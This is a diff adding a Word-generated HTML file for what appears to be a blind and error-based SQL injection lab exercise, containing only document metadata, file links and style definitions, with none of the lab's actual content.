@@ -1,0 +1,2968 @@
+<html xmlns:v="urn:schemas-microsoft-com:vml"
+xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns:m="http://schemas.microsoft.com/office/2004/12/omml"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 15">
+<meta name=Originator content="Microsoft Word 15">
+<link rel=File-List
+href="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/filelist.xml">
+<link rel=Edit-Time-Data
+href="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/editdata.mso">
+<!--[if !mso]>
+<style>
+v\:* {behavior:url(#default#VML);}
+o\:* {behavior:url(#default#VML);}
+w\:* {behavior:url(#default#VML);}
+.shape {behavior:url(#default#VML);}
+</style>
+<![endif]--><!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>D&#432;&#417;ng Công Phúc</o:Author>
+  <o:LastAuthor>Phong Cô&#768;n</o:LastAuthor>
+  <o:Revision>5</o:Revision>
+  <o:TotalTime>563</o:TotalTime>
+  <o:Created>2024-02-21T08:55:00Z</o:Created>
+  <o:LastSaved>2024-02-21T09:06:00Z</o:LastSaved>
+  <o:Pages>1</o:Pages>
+  <o:Words>1352</o:Words>
+  <o:Characters>7713</o:Characters>
+  <o:Lines>64</o:Lines>
+  <o:Paragraphs>18</o:Paragraphs>
+  <o:CharactersWithSpaces>9047</o:CharactersWithSpaces>
+  <o:Version>16.00</o:Version>
+ </o:DocumentProperties>
+ <o:OfficeDocumentSettings>
+  <o:AllowPNG/>
+ </o:OfficeDocumentSettings>
+</xml><![endif]-->
+<link rel=dataStoreItem
+href="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/item0059.xml"
+target="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/props060.xml">
+<link rel=themeData
+href="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/themedata.thmx">
+<link rel=colorSchemeMapping
+href="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/colorschememapping.xml">
+<!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:Zoom>84</w:Zoom>
+  <w:SpellingState>Clean</w:SpellingState>
+  <w:GrammarState>Clean</w:GrammarState>
+  <w:TrackMoves>false</w:TrackMoves>
+  <w:TrackFormatting/>
+  <w:PunctuationKerning/>
+  <w:ValidateAgainstSchemas/>
+  <w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid>
+  <w:IgnoreMixedContent>false</w:IgnoreMixedContent>
+  <w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText>
+  <w:DoNotPromoteQF/>
+  <w:LidThemeOther>EN-US</w:LidThemeOther>
+  <w:LidThemeAsian>JA</w:LidThemeAsian>
+  <w:LidThemeComplexScript>X-NONE</w:LidThemeComplexScript>
+  <w:Compatibility>
+   <w:BreakWrappedTables/>
+   <w:SnapToGridInCell/>
+   <w:WrapTextWithPunct/>
+   <w:UseAsianBreakRules/>
+   <w:DontGrowAutofit/>
+   <w:SplitPgBreakAndParaMark/>
+   <w:EnableOpenTypeKerning/>
+   <w:DontFlipMirrorIndents/>
+   <w:OverrideTableStyleHps/>
+   <w:UseFELayout/>
+  </w:Compatibility>
+  <w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel>
+  <m:mathPr>
+   <m:mathFont m:val="Cambria Math"/>
+   <m:brkBin m:val="before"/>
+   <m:brkBinSub m:val="&#45;-"/>
+   <m:smallFrac m:val="off"/>
+   <m:dispDef/>
+   <m:lMargin m:val="0"/>
+   <m:rMargin m:val="0"/>
+   <m:defJc m:val="centerGroup"/>
+   <m:wrapIndent m:val="1440"/>
+   <m:intLim m:val="subSup"/>
+   <m:naryLim m:val="undOvr"/>
+  </m:mathPr></w:WordDocument>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:LatentStyles DefLockedState="false" DefUnhideWhenUsed="false"
+  DefSemiHidden="false" DefQFormat="false" DefPriority="99"
+  LatentStyleCount="376">
+  <w:LsdException Locked="false" Priority="0" QFormat="true" Name="Normal"/>
+  <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 1"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 2"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 3"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 4"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 5"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 6"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 7"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 8"/>
+  <w:LsdException Locked="false" Priority="9" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="heading 9"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 6"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 7"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 8"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index 9"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 1"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 2"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 3"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 4"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 5"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 6"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 7"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 8"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" Name="toc 9"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Normal Indent"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="footnote text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="annotation text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="header"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="footer"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="index heading"/>
+  <w:LsdException Locked="false" Priority="35" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="caption"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="table of figures"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="envelope address"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="envelope return"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="footnote reference"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="annotation reference"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="line number"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="page number"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="endnote reference"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="endnote text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="table of authorities"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="macro"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="toa heading"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Bullet"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Number"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Bullet 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Bullet 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Bullet 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Bullet 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Number 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Number 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Number 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Number 5"/>
+  <w:LsdException Locked="false" Priority="10" QFormat="true" Name="Title"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Closing"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Signature"/>
+  <w:LsdException Locked="false" Priority="1" SemiHidden="true"
+   UnhideWhenUsed="true" Name="Default Paragraph Font"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text Indent"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Continue"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Continue 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Continue 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Continue 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="List Continue 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Message Header"/>
+  <w:LsdException Locked="false" Priority="11" QFormat="true" Name="Subtitle"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Salutation"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Date"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text First Indent"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text First Indent 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Note Heading"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text Indent 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Body Text Indent 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Block Text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Hyperlink"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="FollowedHyperlink"/>
+  <w:LsdException Locked="false" Priority="22" QFormat="true" Name="Strong"/>
+  <w:LsdException Locked="false" Priority="20" QFormat="true" Name="Emphasis"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Document Map"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Plain Text"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="E-mail Signature"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Top of Form"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Bottom of Form"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Normal (Web)"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Acronym"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Address"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Cite"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Code"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Definition"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Keyboard"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Preformatted"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Sample"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Typewriter"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="HTML Variable"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Normal Table"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="annotation subject"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="No List"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Outline List 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Outline List 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Outline List 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Simple 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Simple 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Simple 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Classic 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Classic 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Classic 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Classic 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Colorful 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Colorful 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Colorful 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Columns 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Columns 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Columns 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Columns 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Columns 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 6"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 7"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Grid 8"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 4"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 5"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 6"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 7"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table List 8"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table 3D effects 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table 3D effects 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table 3D effects 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Contemporary"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Elegant"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Professional"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Subtle 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Subtle 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Web 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Web 2"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Web 3"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Balloon Text"/>
+  <w:LsdException Locked="false" Priority="39" Name="Table Grid"/>
+  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
+   Name="Table Theme"/>
+  <w:LsdException Locked="false" SemiHidden="true" Name="Placeholder Text"/>
+  <w:LsdException Locked="false" Priority="1" QFormat="true" Name="No Spacing"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 1"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 1"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 1"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 1"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 1"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 1"/>
+  <w:LsdException Locked="false" SemiHidden="true" Name="Revision"/>
+  <w:LsdException Locked="false" Priority="34" QFormat="true"
+   Name="List Paragraph"/>
+  <w:LsdException Locked="false" Priority="29" QFormat="true" Name="Quote"/>
+  <w:LsdException Locked="false" Priority="30" QFormat="true"
+   Name="Intense Quote"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 1"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 1"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 1"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 1"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 1"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 1"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 1"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 1"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 2"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 2"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 2"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 2"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 2"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 2"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 2"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 2"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 2"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 2"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 2"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 2"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 2"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 2"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 3"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 3"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 3"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 3"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 3"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 3"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 3"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 3"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 3"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 3"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 3"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 3"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 3"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 3"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 4"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 4"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 4"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 4"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 4"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 4"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 4"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 4"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 4"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 4"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 4"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 4"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 4"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 4"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 5"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 5"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 5"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 5"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 5"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 5"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 5"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 5"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 5"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 5"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 5"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 5"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 5"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 5"/>
+  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 6"/>
+  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 6"/>
+  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 6"/>
+  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 6"/>
+  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 6"/>
+  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 6"/>
+  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 6"/>
+  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 6"/>
+  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 6"/>
+  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 6"/>
+  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 6"/>
+  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 6"/>
+  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 6"/>
+  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 6"/>
+  <w:LsdException Locked="false" Priority="19" QFormat="true"
+   Name="Subtle Emphasis"/>
+  <w:LsdException Locked="false" Priority="21" QFormat="true"
+   Name="Intense Emphasis"/>
+  <w:LsdException Locked="false" Priority="31" QFormat="true"
+   Name="Subtle Reference"/>
+  <w:LsdException Locked="false" Priority="32" QFormat="true"
+   Name="Intense Reference"/>
+  <w:LsdException Locked="false" Priority="33" QFormat="true" Name="Book Title"/>
+  <w:LsdException Locked="false" Priority="37" SemiHidden="true"
+   UnhideWhenUsed="true" Name="Bibliography"/>
+  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
+   UnhideWhenUsed="true" QFormat="true" Name="TOC Heading"/>
+  <w:LsdException Locked="false" Priority="41" Name="Plain Table 1"/>
+  <w:LsdException Locked="false" Priority="42" Name="Plain Table 2"/>
+  <w:LsdException Locked="false" Priority="43" Name="Plain Table 3"/>
+  <w:LsdException Locked="false" Priority="44" Name="Plain Table 4"/>
+  <w:LsdException Locked="false" Priority="45" Name="Plain Table 5"/>
+  <w:LsdException Locked="false" Priority="40" Name="Grid Table Light"/>
